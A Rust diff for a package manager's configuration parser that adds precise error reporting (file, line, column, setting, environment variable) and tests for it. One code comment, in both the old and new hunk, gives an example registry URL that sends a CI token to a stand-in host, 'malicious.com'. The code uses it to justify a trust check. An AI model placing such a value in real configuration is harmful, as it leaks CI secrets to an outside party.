@@ -220,56 +220,93 @@ fn take_requires_trust() -> bool {
     })
 }
 
+fn hydrate_interpolated<T: FromFileString, E: de::Error>(value: &str) -> Result<Interpolated<T>, E> where <T as FromFileString>::Error: Display {
+    let hydrated
+        = T::from_file_string(value)
+            .map_err(de::Error::custom)?;
+
+    Ok(Interpolated::new(hydrated))
+}
+
+/// We use a visitor rather than an untagged enum, as the latter would replace
+/// the actual error (for example "invalid type: sequence, expected a string")
+/// by a generic "data did not match any variant" message. Raising the errors
+/// from within the visitor also lets the YAML deserializer attach the location
+/// of the faulty value to them.
+struct InterpolatedVisitor<T> {
+    marker: std::marker::PhantomData<T>,
+}
+
+impl<'de, T: FromFileString + Deserialize<'de>> de::Visitor<'de> for InterpolatedVisitor<T> where <T as FromFileString>::Error: Display {
+    type Value = Interpolated<T>;
+
+    fn expecting(&self, formatter: &mut std::fmt::Formatter) -> std::fmt::Result {
+        formatter.write_str("a configuration value")
+    }
+
+    fn visit_str<E: de::Error>(self, value: &str) -> Result<Self::Value, E> {
+        let interpolated
+            = shellexpand::env(value)
+                .map_err(de::Error::custom)?;
+
+        if interpolated.as_ref() != value {
+            // If the interpolated value is different from the original, that means it may leak CI secrets,
+            // for example with `npmRegistryServer: https://malicious.com/${GITHUB_TOKEN}`.
+            mark_requires_trust();
+        }
+
+        hydrate_interpolated(&interpolated)
+    }
+
+    fn visit_i64<E: de::Error>(self, value: i64) -> Result<Self::Value, E> {
+        hydrate_interpolated(&value.to_string())
+    }
+
+    fn visit_u64<E: de::Error>(self, value: u64) -> Result<Self::Value, E> {
+        hydrate_interpolated(&value.to_string())
+    }
+
+    fn visit_f64<E: de::Error>(self, value: f64) -> Result<Self::Value, E> {
+        hydrate_interpolated(&value.to_string())
+    }
+
+    fn visit_bool<E: de::Error>(self, value: bool) -> Result<Self::Value, E> {
+        T::deserialize(de::value::BoolDeserializer::new(value))
+            .map(Interpolated::new)
+    }
+
+    fn visit_unit<E: de::Error>(self) -> Result<Self::Value, E> {
+        T::deserialize(de::value::UnitDeserializer::new())
+            .map(Interpolated::new)
+    }
+
+    fn visit_none<E: de::Error>(self) -> Result<Self::Value, E> {
+        self.visit_unit()
+    }
+
+    fn visit_some<D: Deserializer<'de>>(self, deserializer: D) -> Result<Self::Value, D::Error> {
+        deserializer.deserialize_any(self)
+    }
+
+    fn visit_seq<A: de::SeqAccess<'de>>(self, seq: A) -> Result<Self::Value, A::Error> {
+        T::deserialize(de::value::SeqAccessDeserializer::new(seq))
+            .map(Interpolated::new)
+    }
+
+    fn visit_map<A: de::MapAccess<'de>>(self, map: A) -> Result<Self::Value, A::Error> {
+        T::deserialize(de::value::MapAccessDeserializer::new(map))
+            .map(Interpolated::new)
+    }
+
+    fn visit_enum<A: de::EnumAccess<'de>>(self, data: A) -> Result<Self::Value, A::Error> {
+        T::deserialize(de::value::EnumAccessDeserializer::new(data))
+            .map(Interpolated::new)
+    }
+}
+
 impl<'de, T: FromFileString + Deserialize<'de>> Deserialize<'de> for Interpolated<T> where <T as FromFileString>::Error: Display {
     fn deserialize<D: Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
-        #[derive(Deserialize)]
-        #[serde(untagged)]
-        enum StringOrAnything<T> {
-            String(String),
-            Integer(i64),
-            Float(f64),
-            Anything(T),
-        }
-
-        match StringOrAnything::<T>::deserialize(deserializer)? {
-            StringOrAnything::String(s) => {
-                let interpolated
-                    = shellexpand::env(&s)
-                        .map_err(de::Error::custom)?;
-
-                if interpolated.as_ref() != s {
-                    // If the interpolated value is different from the original, that means it may leak CI secrets,
-                    // for example with `npmRegistryServer: https://malicious.com/${GITHUB_TOKEN}`.
-                    mark_requires_trust();
-                }
-
-                let hydrated
-                    = T::from_file_string(&interpolated)
-                        .map_err(de::Error::custom)?;
-
-                Ok(Interpolated::new(hydrated))
-            },
-
-            StringOrAnything::Integer(value) => {
-                let hydrated
-                    = T::from_file_string(&value.to_string())
-                        .map_err(de::Error::custom)?;
-
-                Ok(Interpolated::new(hydrated))
-            },
-
-            StringOrAnything::Float(value) => {
-                let hydrated
-                    = T::from_file_string(&value.to_string())
-                        .map_err(de::Error::custom)?;
-
-                Ok(Interpolated::new(hydrated))
-            },
-
-            StringOrAnything::Anything(anything) => {
-                Ok(Interpolated::new(anything))
-            },
-        }
+        deserializer.deserialize_any(InterpolatedVisitor {marker: std::marker::PhantomData})
     }
 }
 
@@ -443,9 +480,7 @@ impl<T: std::fmt::Debug + Serialize + MergeSettings> MergeSettings for Vec<T> {
 
         for item_str in items {
             let value
-                = T::from_env_string(item_str, None)
-                    .map_err(|e| HydrateError::InvalidValue(e.to_string()))
-                        .unwrap();
+                = T::from_env_string(item_str, None)?;
 
             result.push(value);
         }
@@ -1035,6 +1070,76 @@ pub enum ConfigurationError {
 
     #[error("Couldn't find a home directory to compute the default global folder; set the globalFolder setting (or the YARN_GLOBAL_FOLDER environment variable)")]
     MissingGlobalFolder,
+
+    #[error("{}", format_invalid_source(.origin, .location.as_ref(), .setting.as_deref(), .message))]
+    InvalidSource {
+        origin: ConfigurationOrigin,
+        location: Option<ConfigurationLocation>,
+        setting: Option<String>,
+        message: String,
+    },
+}
+
+/// Where a configuration value comes from, so that errors can point the user
+/// to the place they need to fix.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum ConfigurationOrigin {
+    File(Path),
+    EnvironmentVariable(String),
+}
+
+impl Display for ConfigurationOrigin {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            // We print the absolute path (rather than one relative to the home
+            // directory) so that it can be copied as-is
+            ConfigurationOrigin::File(path)
+                => write!(f, "{}", DataType::Path.colorize(&path.to_file_string())),
+
+            ConfigurationOrigin::EnvironmentVariable(name)
+                => write!(f, "environment variable {}", name),
+        }
+    }
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct ConfigurationLocation {
+    pub line: usize,
+    pub column: usize,
+}
+
+impl From<serde_yaml::Location> for ConfigurationLocation {
+    fn from(location: serde_yaml::Location) -> Self {
+        Self {line: location.line(), column: location.column()}
+    }
+}
+
+fn format_invalid_source(origin: &ConfigurationOrigin, location: Option<&ConfigurationLocation>, setting: Option<&str>, message: &str) -> String {
+    let mut result
+        = origin.to_string();
+
+    if let Some(location) = location {
+        result.push_str(&format!(":{}:{}", location.line, location.column));
+    }
+
+    if let Some(setting) = setting {
+        result.push_str(&format!(": {}", setting));
+    }
+
+    result.push_str(&format!(": {}", message));
+    result
+}
+
+impl ConfigurationError {
+    fn with_origin(self, origin: ConfigurationOrigin) -> Self {
+        match self {
+            ConfigurationError::InvalidSource {..}
+                => self,
+
+            error
+                => ConfigurationError::InvalidSource {origin, location: None, setting: None, message: error.to_string()},
+        }
+    }
 }
 
 impl From<std::io::Error> for ConfigurationError {
@@ -1073,6 +1178,31 @@ pub enum HydrateError {
 
     #[error("Invalid configuration value ({0})")]
     InvalidValue(String),
+}
+
+impl HydrateError {
+    /// The error message without the generic prefix, for when the context
+    /// already says that the value is invalid.
+    fn into_message(self) -> String {
+        match self {
+            HydrateError::InvalidValue(message)
+                => message,
+
+            error
+                => error.to_string(),
+        }
+    }
+}
+
+/// Wraps the error returned when an environment variable fails to override a
+/// setting, so that it says which variable is at fault.
+fn env_override_error(env_name: &str, setting: &str, error: HydrateError) -> ConfigurationError {
+    ConfigurationError::InvalidSource {
+        origin: ConfigurationOrigin::EnvironmentVariable(env_name.to_string()),
+        location: None,
+        setting: Some(setting.to_string()),
+        message: error.into_message(),
+    }
 }
 
 struct RcFile {
@@ -1183,31 +1313,85 @@ fn retain_user_conflict_fields(value: &mut serde_yaml::Value, root_mode: Option<
     }
 }
 
-fn deserialize_intermediate_settings(value: Option<serde_yaml::Value>) -> Result<(Partial<intermediate::Settings>, bool), ConfigurationError> {
+/// Turns the path reported by serde into the name of the setting at fault;
+/// `None` if the error is about the document itself.
+fn setting_from_path(path: &serde_path_to_error::Path) -> Option<String> {
+    if path.iter().next().is_none() {
+        return None;
+    }
+
+    Some(path.to_string())
+}
+
+/// The values we deserialize have been normalized beforehand (the conflict
+/// metadata got removed), so they don't remember where they were in the file.
+/// To still point at the right line we replay the deserialization on the raw
+/// text, and use its location if it fails on the same setting.
+fn locate_setting_error(text: &str, path: &serde_path_to_error::Path) -> Option<ConfigurationLocation> {
+    let deserializer
+        = serde_yaml::Deserializer::from_str(text);
+
+    let Err(error) = serde_path_to_error::deserialize::<_, intermediate::Settings>(deserializer) else {
+        return None;
+    };
+
+    if error.path().to_string() != path.to_string() {
+        return None;
+    }
+
+    error.inner().location()
+        .map(ConfigurationLocation::from)
+}
+
+fn deserialize_intermediate_settings(rc: &RcFile, value: Option<serde_yaml::Value>) -> Result<(Partial<intermediate::Settings>, bool), ConfigurationError> {
     let Some(value) = value else {
         return Ok((Partial::Missing, false));
     };
 
     reset_requires_trust();
 
-    let settings
-        = serde_yaml::from_value(value)?;
+    let settings: intermediate::Settings = serde_path_to_error::deserialize(value).map_err(|error| {
+        let location = rc.text.as_deref()
+            .and_then(|text| locate_setting_error(text, error.path()));
+
+        ConfigurationError::InvalidSource {
+            origin: ConfigurationOrigin::File(rc.path.clone()),
+            location,
+            setting: setting_from_path(error.path()),
+            message: error.into_inner().to_string(),
+        }
+    })?;
+
     let requires_trust
         = take_requires_trust();
+
+    validate_intermediate_settings(&settings)
+        .map_err(|error| error.with_origin(ConfigurationOrigin::File(rc.path.clone())))?;
 
     Ok((Partial::Value(settings), requires_trust))
 }
 
-fn deserialize_rc_pair(user_rc: Option<&RcFile>, project_rc: Option<&RcFile>) -> Result<(Partial<intermediate::Settings>, Partial<intermediate::Settings>, bool), ConfigurationError> {
-    let mut user_value = user_rc
-        .and_then(|rc| rc.text.as_ref())
-        .map(|text| serde_yaml::from_str::<serde_yaml::Value>(text))
-        .transpose()?;
+fn parse_rc_value(rc: Option<&RcFile>) -> Result<Option<serde_yaml::Value>, ConfigurationError> {
+    let Some(rc) = rc else {
+        return Ok(None);
+    };
 
-    let mut project_value = project_rc
-        .and_then(|rc| rc.text.as_ref())
-        .map(|text| serde_yaml::from_str::<serde_yaml::Value>(text))
-        .transpose()?;
+    let Some(text) = &rc.text else {
+        return Ok(None);
+    };
+
+    let value
+        = serde_yaml::from_str::<serde_yaml::Value>(text)
+            .map_err(|error| ConfigurationError::from(error).with_origin(ConfigurationOrigin::File(rc.path.clone())))?;
+
+    Ok(Some(value))
+}
+
+fn deserialize_rc_pair(user_rc: Option<&RcFile>, project_rc: Option<&RcFile>) -> Result<(Partial<intermediate::Settings>, Partial<intermediate::Settings>, bool), ConfigurationError> {
+    let mut user_value
+        = parse_rc_value(user_rc)?;
+    let mut project_value
+        = parse_rc_value(project_rc)?;
 
     let user_field_modes = user_value
         .as_mut()
@@ -1226,10 +1410,17 @@ fn deserialize_rc_pair(user_rc: Option<&RcFile>, project_rc: Option<&RcFile>) ->
         retain_user_conflict_fields(user_value, project_root_mode, &project_field_modes);
     }
 
-    let (user, _user_config_requires_trust)
-        = deserialize_intermediate_settings(user_value)?;
-    let (project, requires_trust)
-        = deserialize_intermediate_settings(project_value)?;
+    // The values can only be set if their rc file exists, but we need the
+    // rc file itself to report errors
+    let (user, _user_config_requires_trust) = match user_rc {
+        Some(user_rc) => deserialize_intermediate_settings(user_rc, user_value)?,
+        None => (Partial::Missing, false),
+    };
+
+    let (project, requires_trust) = match project_rc {
+        Some(project_rc) => deserialize_intermediate_settings(project_rc, project_value)?,
+        None => (Partial::Missing, false),
+    };
 
     Ok((user, project, requires_trust))
 }
@@ -1290,11 +1481,15 @@ impl Configuration {
         self.settings.tree_node(None, None)
     }
 
-    pub fn validate(text: &str) -> Result<(), ConfigurationError> {
-        let project
-            = serde_yaml::from_str::<intermediate::Settings>(text)?;
+    /// Checks that `text` would be a valid content for the rc file at `path`.
+    pub fn validate(path: &Path, text: &str) -> Result<(), ConfigurationError> {
+        let rc
+            = RcFile {path: path.clone(), text: Some(text.to_string())};
 
-        validate_intermediate_settings(&project)?;
+        let value
+            = parse_rc_value(Some(&rc))?;
+
+        deserialize_intermediate_settings(&rc, value)?;
 
         Ok(())
     }
@@ -1411,12 +1606,15 @@ impl Configuration {
         let (intermediate_user_config, intermediate_project_config, requires_trust)
             = deserialize_rc_pair(user_rc.as_ref(), project_rc.as_ref())?;
 
-        let mut settings = Settings::merge(
+        let settings = Settings::merge(
             &enriched_context,
             intermediate_user_config,
             intermediate_project_config,
             || panic!("No configuration found")
         );
+
+        let mut settings
+            = settings.apply_env_overrides(&enriched_context)?;
 
         settings.catalogs.entry("default".to_string())
             .or_default()
@@ -1660,6 +1858,135 @@ mod tests {
         assert_eq!(sets.len(), 1);
         assert_eq!(sets[0].os, os(&["linux"]));
         assert_eq!(sets[0].arch, cpu(&["x64"]));
+    }
+
+    fn rc_file(path: &str, text: &str) -> RcFile {
+        RcFile {
+            path: Path::from_file_string(path).unwrap(),
+            text: Some(text.to_string()),
+        }
+    }
+
+    fn rc_pair_error(user_text: &str, project_text: &str) -> ConfigurationError {
+        let user_rc
+            = rc_file("/home/.yarnrc.yml", user_text);
+        let project_rc
+            = rc_file("/project/.yarnrc.yml", project_text);
+
+        let Err(error) = deserialize_rc_pair(Some(&user_rc), Some(&project_rc)) else {
+            panic!("The configuration should be invalid");
+        };
+
+        error
+    }
+
+    fn invalid_source(origin: &str, location: Option<(usize, usize)>, setting: Option<&str>, message: &str) -> ConfigurationError {
+        ConfigurationError::InvalidSource {
+            origin: ConfigurationOrigin::File(Path::from_file_string(origin).unwrap()),
+            location: location.map(|(line, column)| ConfigurationLocation {line, column}),
+            setting: setting.map(|setting| setting.to_string()),
+            message: message.to_string(),
+        }
+    }
+
+    fn assert_error_eq(actual: ConfigurationError, expected: ConfigurationError) {
+        assert_eq!(format!("{:?}", actual), format!("{:?}", expected));
+    }
+
+    #[test]
+    fn errors_should_report_the_file_containing_malformed_yaml() {
+        let error
+            = rc_pair_error("npmScopes:\n  @foo:\n    npmAlwaysAuth: true\n", "enableScripts: false\n");
+
+        let ConfigurationError::InvalidSource {origin, setting, message, ..} = error else {
+            panic!("Unexpected error: {error:?}");
+        };
+
+        assert_eq!(origin, ConfigurationOrigin::File(Path::from_file_string("/home/.yarnrc.yml").unwrap()));
+        assert_eq!(setting, None);
+        assert!(message.contains("at line 2 column 3"), "Unexpected message: {message}");
+    }
+
+    #[test]
+    fn errors_should_report_the_setting_with_an_invalid_scalar() {
+        assert_error_eq(
+            rc_pair_error("enableTelemetry: false\n", "enableTelemetry: false\nenableScripts: maybe\n"),
+            invalid_source("/project/.yarnrc.yml", Some((2, 16)), Some("enableScripts"), "Invalid value: maybe"),
+        );
+    }
+
+    #[test]
+    fn errors_should_report_the_path_of_an_invalid_nested_setting() {
+        assert_error_eq(
+            rc_pair_error("enableTelemetry: false\n", "npmScopes:\n  foo:\n    npmAlwaysAuth: 12\n"),
+            invalid_source("/project/.yarnrc.yml", Some((3, 20)), Some("npmScopes.foo.npmAlwaysAuth"), "Invalid value: 12"),
+        );
+    }
+
+    #[test]
+    fn errors_should_report_the_type_mismatch_of_an_interpolated_setting() {
+        assert_error_eq(
+            rc_pair_error("enableTelemetry: false\n", "npmRegistryServer: [foo]\n"),
+            invalid_source("/project/.yarnrc.yml", Some((1, 20)), Some("npmRegistryServer"), "invalid type: sequence, expected a string"),
+        );
+    }
+
+    #[test]
+    fn errors_should_report_invalid_enum_values() {
+        assert_error_eq(
+            rc_pair_error("enableTelemetry: false\n", "nodeLinker: foo\n"),
+            invalid_source("/project/.yarnrc.yml", Some((1, 13)), Some("nodeLinker"), "Invalid enum value (foo)"),
+        );
+    }
+
+    #[test]
+    fn errors_should_report_the_home_configuration_when_it_is_the_one_at_fault() {
+        assert_error_eq(
+            rc_pair_error("enableScripts: maybe\n", "enableScripts: true\n"),
+            invalid_source("/home/.yarnrc.yml", Some((1, 16)), Some("enableScripts"), "Invalid value: maybe"),
+        );
+    }
+
+    #[test]
+    fn errors_should_report_the_index_of_invalid_list_entries() {
+        assert_error_eq(
+            rc_pair_error("enableTelemetry: false\n", "packageRules:\n  - npmMinimalAgeGate: 1d\n"),
+            invalid_source("/project/.yarnrc.yml", None, None, "Invalid configuration: packageRules[0] must define at least one filter"),
+        );
+    }
+
+    #[test]
+    fn errors_should_report_the_environment_variable_at_fault() {
+        let mut env
+            = BTreeMap::new();
+
+        env.insert("YARN_ENABLE_SCRIPTS".to_string(), "maybe".to_string());
+
+        let context = ConfigurationContext {
+            env,
+            user_cwd: None,
+            project_cwd: None,
+            package_cwd: None,
+        };
+
+        let Err(error) = settings_from_yaml("enableScripts: true\n").apply_env_overrides(&context) else {
+            panic!("The configuration should be invalid");
+        };
+
+        assert_error_eq(error, ConfigurationError::InvalidSource {
+            origin: ConfigurationOrigin::EnvironmentVariable("YARN_ENABLE_SCRIPTS".to_string()),
+            location: None,
+            setting: Some("enableScripts".to_string()),
+            message: "Invalid value: maybe".to_string(),
+        });
+    }
+
+    #[test]
+    fn errors_should_be_formatted_on_a_single_line() {
+        let error
+            = invalid_source("/project/.yarnrc.yml", Some((3, 20)), Some("npmScopes.foo.npmAlwaysAuth"), "Invalid value: 12");
+
+        assert_eq!(error.to_string(), "/project/.yarnrc.yml:3:20: npmScopes.foo.npmAlwaysAuth: Invalid value: 12");
     }
 
     #[test]
